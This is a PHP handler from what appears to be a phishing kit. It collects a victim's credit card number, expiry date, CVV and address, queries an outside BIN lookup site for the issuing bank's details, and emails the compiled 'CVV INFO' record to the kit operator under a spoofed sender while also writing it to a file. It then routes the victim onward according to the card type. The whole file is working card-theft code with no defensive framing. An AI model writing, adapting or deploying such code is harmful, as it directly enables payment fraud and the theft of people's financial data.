<?php
include 'config.php';
        $ip = getenv("REMOTE_ADDR");
if (isset($_POST['cc_number']) && isset($_POST['exp']) && isset($_POST['csc'])) {
    $_SESSION['cart'] = $cc  = $_POST['cc_number'];
    $_SESSION['typecc'] = $typecc = $_POST['cc_card_type'];
    $exp = $_POST['exp'];
    $csc = $_POST['csc'];
    $x_address = $_POST['x_address'];
$bin = buka("http://credit-cardity.com/iin-bin/number-lookup/".substr($cc,0,6));
$url = fetch_value($bin,'Issuer Bank Website</td><td><a target="_blank" rel="nofollow" href="','"');
$_SESSION['url'] =  $find_url = str($url);
$bank = fetch_value($bin,'Issuer Bank Name</td><td>','</td>');
$_SESSION['bank'] =  $find_bank = str($bank);
$country = fetch_value($bin,'Card Country</td><td>','</td>');
$_SESSION['country'] =  $find_country = str($country);
$type = fetch_value($bin,'Card Type</td><td>','</td>');
$_SESSION['type'] = $find_type = str($type);
$category = fetch_value($bin,'Card Category</td><td>','</td>');
$_SESSION['category'] =  $find_category = str($category);
$Brand = fetch_value($bin,'Card Brand</td><td>','</td>');
$_SESSION['Brand'] =  $find_Brand = str($Brand);
$phonrt = fetch_value($bin,'Issuer Bank Phone Number</td><td>','</td>');
$_SESSION['phone'] =  $find_phonrt = str($phonrt);
  $ip = getenv("REMOTE_ADDR");
        $message.= "=======================================================\n";
        $message.= "Card Number  :  ".$cc."\n";
        $message.= "Expire Date  :  ".$exp."\n";
        $message.= "CVV/CVV2  :  ".$csc."\n";
        $message.= "Full Address  :  ".$x_address."\n";
        $message.= "Card Type  :  ".$find_type."\n";
        $message.= "Card Level  :  ".$find_category."\n";
        $message.= "Bank Name:  :  ".$find_bank."\n";
        $message.= "Bank Country  :  ".$find_country."\n";
        $message.= "Bank Website  :  ".$find_url."\n";
        $message.= "Bank Phone  :  ".$find_phonrt."\n";
        $message.= "=======================================================\n";
        $message.= "Client IP  :  ".$ip."           \n";
        $message.= "IP Link  :  http://ip-api.com/#".$ip."\n";
        $message.= "=======================================================\n";
        $subject = "CVV INFO-- [ $ip ] - [$country] - [$find_type] - $find_bank - $find_category ";
        $headers = "From: Hamalt.iq <RezltHamalt@Rezlt.iq.com>\r\n";
        mail($email,$subject,$message,$headers);
        fwrite($file,$message);
        fclose($file);
		if(($typecc == 'visa') or ($typecc == 'mastercard') or ($typecc == 'amex'))
		{
		echo 'success_no_tl';
		}
		else{
		echo 'to_bank';
		}
}
?>